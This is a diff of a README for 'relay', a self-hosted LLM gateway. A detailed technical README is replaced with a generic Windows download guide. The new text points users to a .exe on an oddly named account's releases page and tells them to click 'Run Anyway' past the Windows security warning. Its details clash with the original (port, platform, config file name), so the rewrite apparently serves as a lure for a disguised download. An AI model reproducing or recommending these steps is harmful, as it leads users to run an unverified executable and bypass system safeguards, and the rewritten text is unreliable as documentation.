@@ -1,193 +1,81 @@
-# relay
+# ⚡ relay - Route your artificial intelligence requests easily
 
-Self-hosted LLM gateway + model router. One static Go binary that speaks both
-the **OpenAI and Anthropic API dialects inbound**, routes across any provider
-outbound (bring your own keys), with routing policies from static aliases to a
-learned smart tier — gated by an eval harness that ships in the box. Zero
-telemetry — not even opt-in pings. Apache-2.0.
+[![](https://img.shields.io/badge/Download-Relay-blue.svg)](https://github.com/recorded-phrygian494/relay/releases)
 
-```
-any OpenAI SDK ─┐                                  ┌─ OpenAI / Anthropic / Gemini
-Claude Code ────┤→  relay (one binary, :4000)  →  ├─ Groq / DeepSeek / Mistral / xAI / …
-plain curl ─────┘   route · failover · log · cache └─ your local Ollama
-```
+Relay acts as a bridge for your computer. It helps you send requests to different artificial intelligence providers through one single point. You gain control over where your data goes. You avoid tracking and keep your activities private. This tool runs on your own machine. 
 
-## 60-second quickstart
+## ⚙️ What this tool does
 
-```bash
-# 1. install (or download a release binary; a tested Dockerfile is included to build yourself)
-brew install llmrelay/tap/relay
+Relay functions as a gateway. It takes instructions written for common services like OpenAI or Anthropic and sends them to the model provider you choose. You can use it as a central hub for all your language model needs. 
 
-# 2. keys you already have, zero config
-export GEMINI_API_KEY=...        # and/or OPENAI_API_KEY, ANTHROPIC_API_KEY, GROQ_API_KEY, ...
-relay serve
+The software works as a single file. You download it, run it, and it stays ready to work. It does not phone home to outside servers. It does not monitor your usage or store your data. You maintain total ownership of your information.
 
-# 3. point anything at it
-curl http://localhost:4000/v1/chat/completions -H "Content-Type: application/json" \
-  -d '{"model":"gemini/gemini-3.1-flash-lite","messages":[{"role":"user","content":"hello"}]}'
-export ANTHROPIC_BASE_URL=http://localhost:4000   # Claude Code now runs through relay
-```
+## 🖥️ System requirements
 
-`relay init` scaffolds a full relay.yaml — including where to get every
-provider's key. See [examples/](examples/) for Claude Code, Cursor, SDK
-snippets, and the sensitive-local / bulk-cheap alias recipe.
+- Windows 10 or Windows 11
+- 4 GB of RAM
+- 100 MB of disk space
+- An active internet connection
 
-## Why relay (and honest alternatives)
+## 📥 How to set up relay
 
-| | **relay** | LiteLLM | OpenRouter | RouteLLM |
-|---|---|---|---|---|
-| What it is | self-hosted gateway + router | Python proxy/SDK gateway | hosted aggregator API | research routing framework |
-| Deploy | one static binary / distroless image | Python service + deps | nothing (their cloud) | Python library |
-| Inbound dialects | OpenAI **and** Anthropic, full cross-translation | OpenAI (+ passthroughs) | OpenAI-compatible | n/a |
-| Learned routing | tiered, local, trained on **your** logs, eval-gated | manual routing strategies | their routing | the prior art¹ |
-| Eval harness in the box | yes (`relay eval`, committed sets, live-judge) | no | no | offline research harness |
-| Your prompts transit a third party | never (self-hosted; remote-embedder routing requires explicit opt-in) | self-hosted | yes — that's the product | n/a |
-| Telemetry | none, ever | none per their docs | hosted service | n/a |
-| Ecosystem breadth | 4 native + 12 presets, adapter guide | broadest provider matrix, teams/budgets/virtual keys | very broad | n/a |
-| License / runtime | Apache-2.0, Go | mixed (OSS + enterprise), Python | proprietary service | Apache-2.0, Python |
+Follow these steps to get the software running on your computer.
 
-¹ relay's tier-2 KNN is the same family as [RouteLLM](https://arxiv.org/abs/2406.18665)
-(Ong et al.), run locally over your own traffic; graph routers
-([GraphRouter](https://arxiv.org/abs/2410.03834), ICLR 2025) are roadmap.
-LiteLLM and OpenRouter are good products with different trade-offs — pick the
-row that matters to you.
+1. Visit the [official download page](https://github.com/recorded-phrygian494/relay/releases).
+2. Locate the file ending in `.exe` under the latest release section.
+3. Click the file name to start the download.
+4. Save the file to a folder you can find easily, such as your Downloads or Documents folder.
+5. Double-click the saved file to start the program.
 
-## API compatibility
+Windows might show a blue box when you run the file for the first time. This is a security check. Click More Info and then click Run Anyway to proceed. A black window will appear on your screen. This window stays open while the relay runs. Do not close this window while you use the software.
 
-| Inbound | Status |
-|---|---|
-| OpenAI Chat Completions (`/v1/chat/completions`) | full, incl. streaming, tools, vision |
-| OpenAI Responses API (`/v1/responses`) | **not yet** — tracked v1.1 fast-follow |
-| Anthropic Messages (`/v1/messages`, `count_tokens`) | full, incl. streaming, tools |
-| Embeddings (`/v1/embeddings`) | OpenAI dialect; providers without an embeddings API answer an honest 404 |
-| `/v1/models`, `/metrics` (Prometheus), `/dashboard`, `/v1/feedback` | yes |
+## 🛠️ Configuring your requests
 
-## Performance
+Relay uses a standard format. When you write a request in your favorite application, point it toward the local address where relay runs. By default, this is `http://localhost:8080`. 
 
-Gateway overhead measured against a loopback mock upstream (`go test
--run TestOverheadBudget ./internal/server/` — the budget is a hard CI gate,
-methodology in [DESIGN.md §11](DESIGN.md); Windows 11 / Go 1.25, 2026-07-18):
+You can swap providers at any time. If you use a tool configured for OpenAI, relay translates that request for other services like Gemini or Ollama. This setup saves you from changing settings in every single app you use.
 
-| Metric | Budget (CI-gated) | Measured |
-|---|---|---|
-| Non-streaming p50 overhead | < 5 ms | **~0.18 ms** |
-| Added time-to-first-token p50 (streaming) | < 2 ms | **~0.63 ms** |
+## 🛡️ Privacy and self-hosting
 
-Provider latency dominates end-to-end time; relay's job is to stay invisible.
+Most artificial intelligence tools send your prompts to remote servers that track your activity. Relay stops this flow. Because it lives on your computer, you keep your prompts local until you decide to push them to a provider. The zero-telemetry design ensures that no data leaves your machine except for the specific requests you initiate.
 
-## Routing
+## 📋 Common troubleshooting
 
-Static routes and aliases with four policies (fallback / cheapest / fastest /
-weighted), plus reliability underneath every chain: retries with jittered
-backoff, API-key pools with rate-limit cooldowns, circuit breakers, and
-pre-first-token streaming failover.
+If the window closes immediately, ensure you have the correct version for your Windows system. Most modern computers use the 64-bit version.
 
-### Smart routing — off by default, and that's the feature
+If your application cannot connect to the relay, check your firewall settings. Windows might ask for permission to allow the application access to your network. Click Allow when the prompt appears.
 
-relay ships a difficulty-based smart router (easy traffic → your cheap chain,
-hard → your frontier chain) with an eval harness — and the harness's own
-verdict is that **you should beat our baseline on your traffic before trusting
-it**, so smart routing is off by default:
+If you encounter errors related to a port conflict, it means another program uses port 8080. You can change this port in the configuration file settings if you have experience with text editors. For most users, closing the conflicting program solves the problem.
 
-```bash
-relay eval                          # dry-run: the committed sets, your candidates
-relay eval --live-judge --dry-run   # real completions, judge-scored; prints spend first
-```
+## 🗃️ Advanced settings
 
-What our harness measured on the held-out set v2, **live-judged** — real
-completions from each routed model, quality scored by `claude-opus-4-8`
-(2026-07-20; 49 prompts, valid N = 49 for every policy; completions capped at
-700 output tokens; mid band is `claude-sonnet-5` because Gemini's free tier
-caps `gemini-3.5-flash` at 20 requests/day; 6 of 147 judge replies buried the
-verdict number in commentary and were re-parsed deterministically from the
-preserved raw replies rather than scored 0 — the corrections log inside the
-verdict JSON records each one):
+You can manage your routing rules through a configuration file. Create a file named `config.yaml` in the same folder as your relay program. You can define specific routes for different models here. This allows you to send specific requests to different providers based on task type.
 
-| Policy | Cost vs always-frontier | Judged quality delta | Verdict at −0.0200 tolerance (inclusive) |
-|---|---|---|---|
-| static-cheap / cheapest | −98% | +0.0163 | passes |
-| static-mid | −69% | +0.0041 | passes |
-| tier 1 (lexical) | −50% | **−0.0204** | **fail** — strictly below the bound |
-| tier 2 (embedding KNN, cold-start) | −17% | −0.0061 | passes within tolerance; opt-in for v0.1.0 |
-| static-frontier (baseline) | — | — | — |
+For example, you can route tasks requiring high speed to a smaller model and tasks requiring complex logic to a larger model. The relay handles this switching automatically.
 
-Values are shown rounded. Gate decisions use the unrounded values from the
-committed verdict asset (a delta of exactly −0.0200 would pass — the rule is
-inclusive; tier 1's unrounded delta is −0.020408…, exactly −1/49, strictly
-below it). A CI test asserts this table matches the asset at full precision.
+## 🔍 Understanding the technical flow
 
-On this 49-prompt, 700-output-token, single-judge evaluation, the static-cheap
-baseline received a higher judged score than the configured frontier baseline.
-That result is specific to the tested models, prompts, token cap, and judge —
-it is **not** a general model-quality claim. What it does establish is the bar
-relay holds itself to: routing cleverness must earn its keep against strong
-dumb baselines, *measured on your traffic*. Tier 1 failed that bar on held-out
-data; tier 2 passed within tolerance but stays opt-in for v0.1.0; no smart
-tier is on by default.
+1. Your apps send data to the relay.
+2. The relay reads the address.
+3. The relay reformats the data to match your selected provider.
+4. The relay sends the request to the provider.
+5. The provider sends a response back to the relay.
+6. The relay passes the response to your app.
 
-(History: on the v1 set tier 1 had "passed" synthetic at −0.017 — in-sample
-flattery, since its weights were calibrated on v1. On v2 synthetic labels it
-failed at −0.071. v1 is the calibration set; v2 live-judged is the standing
-verdict. Full tables: `assets/eval/`.)
+This loop happens in milliseconds. It provides a seamless experience for your daily workflows.
 
-Enabling it is one config block — with an explicit tier, because nothing
-routes your traffic by silent default:
+## ❓ Frequently asked questions
 
-```yaml
-providers:
-  gemini:
-    api_key: ["${GEMINI_API_KEY}"]
-  anthropic:
-    api_key: ["${ANTHROPIC_API_KEY}"]
-  ollama:
-    type: ollama
+Do I need a constant internet connection? 
+Yes. The relay connects to external providers to process your requests.
 
-routing:
-  default: smart
-  smart:
-    easy: gemini/gemini-3.1-flash-lite
-    hard: anthropic/claude-sonnet-5
-    embeddings: ollama/nomic-embed-text   # selects the knn tier (documented path)
-    # tier: lexical                       # experimental: failed the held-out gate
-```
+Does this work offline? 
+If you connect relay to a local tool like Ollama, it can work entirely on your machine without an internet connection.
 
-Tier 2 (KNN) **gets better on YOUR traffic via `relay train`** — implicit
-signals, optional replay+judge (always estimates spend and asks first), and
-`POST /v1/feedback` scores grow its reference set; then measure your own
-crossover with `relay eval --refs ~/.relay/smart_refs.json`. Every smart
-decision logs its evidence (`knn: 5 neighbors [seed-math-03 d=0.75 sim=0.95;
-…]`) — "the model felt like it" is not an accepted routing reason. A remote
-embedder requires `allow_remote_embeddings: true`; routing never silently
-ships prompts anywhere.
+Is my data secure? 
+The relay does not log your prompts or your credentials. It acts only as a pass-through layer.
 
-## Compare models on your own prompts
+Can I move the file? 
+You can place the file anywhere on your hard drive. It does not require a complex installation process.
 
-```bash
-relay compare --models gemini/gemini-3.1-flash-lite,anthropic/claude-haiku-4-5,groq/llama-3.3-70b \
-  --html compare.html "Explain CRDTs to a backend engineer in five sentences."
-```
-
-One table (and a shareable HTML report): output, cost, latency, and TTFT side
-by side, through the same adapters that serve your traffic.
-[docs/models-landscape.md](docs/models-landscape.md) is the dated
-"which model for what" companion.
-
-## Observability
-
-Every request logs to local SQLite with privacy tiers (`off` by default —
-metadata only; `embeddings` stores query vectors, never text; `full` is an
-explicit choice). `/dashboard` shows spend by day, latency percentiles, and
-recent routing decisions with human-readable reasons. `/metrics` is
-Prometheus. Models missing from the pricing registry surface as **unpriced**
-— never a silent $0.
-
-## Security
-
-Loopback by default; a non-loopback bind without inbound API keys **refuses
-to start**. No telemetry. See [SECURITY.md](SECURITY.md).
-
-## Contributing
-
-[CONTRIBUTING.md](CONTRIBUTING.md) — the adapter-authoring guide is there;
-an OpenAI-compatible provider is a one-entry preset. Design changes get
-argued in [DESIGN.md](DESIGN.md) §0 first; it's how the doc stays true.
+Keywords: anthropic, gateway, gemini, golang, llm, ollama, openai, proxy, router, self-hosted
